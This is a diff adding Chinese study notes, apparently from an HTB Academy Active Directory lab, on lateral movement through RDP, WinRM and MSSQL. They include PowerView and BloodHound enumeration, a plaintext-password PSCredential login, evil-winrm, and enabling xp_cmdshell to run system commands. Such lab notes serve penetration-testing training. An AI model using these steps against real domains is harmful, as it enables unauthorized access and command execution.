@@ -1,0 +1,36 @@
+但如果没有域中任何主机的本地管理员权限怎么办？
+还有几种方法可以在 Windows 域中移动：
+  远程桌面协议 (Remote Desktop Protocol) (RDP) - 可提供对目标主机的 GUI 访问
+  PowerShell 远程处理 (PowerShell Remoting) - 也称为 PSRemoting 或 Windows 远程管理 (Windows Remote Management, WinRM) 访问，允许使用 PowerShell 在远程主机上运行命令或进入交互
+  MSSQL Server - 在 SQL Server 实例上具有系统管理员 (sysadmin) 权限的账户可以远程登录该实例并对数据库执行查询，在 SQL Server 服务账户的上下文中运行操作系统命令
+  最简单的方法还是通过 BloodHound，可以显示给定用户拥有哪些类型的远程访问权限：
+    CanRDP
+    CanPSRemote
+    SQLAdmin
+  也可以使用 PowerView 等工具甚至内置工具来枚举这些权限
+
+C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"      枚举RDP权限用户
+用xfreerdp 或 Remmina 等工具登录
+从 Windows 主机进行攻击，可以使用 mstsc.exe
+
+C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"    枚举WinRM权限用户
+也可以在 BloodHound 中利用自定义 Cypher 查询
+方法是将查询粘贴到屏幕底部的 Raw Query 框中，然后按 Enter 键
+  MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force                                    登录WRM
+C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+Linux 攻击主机，可以使用 evil-winrm 
+gem install evil-winrm      安装
+evil-winrm -i 10.129.201.234 -u forend      用forend用户登录
+
+使用 Snaffler 工具来查找包含 SQL 服务器连接字符串的 web.config 或其他类型的配置文件
+  https://github.com/SnaffCon/Snaffler                                                                  枚举SQL
+或 BloodHound 的 Node Info 选项卡中检查 SQL Admin Rights 或 Cypher 查询搜索：
+  MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation      登录MSSQL
+  https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py
+SQL> enable_xp_cmdshell      启动xp_cmdshell (Transact-SQL)
+  https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15
+xp_cmdshell whoami /priv      执行命令
+
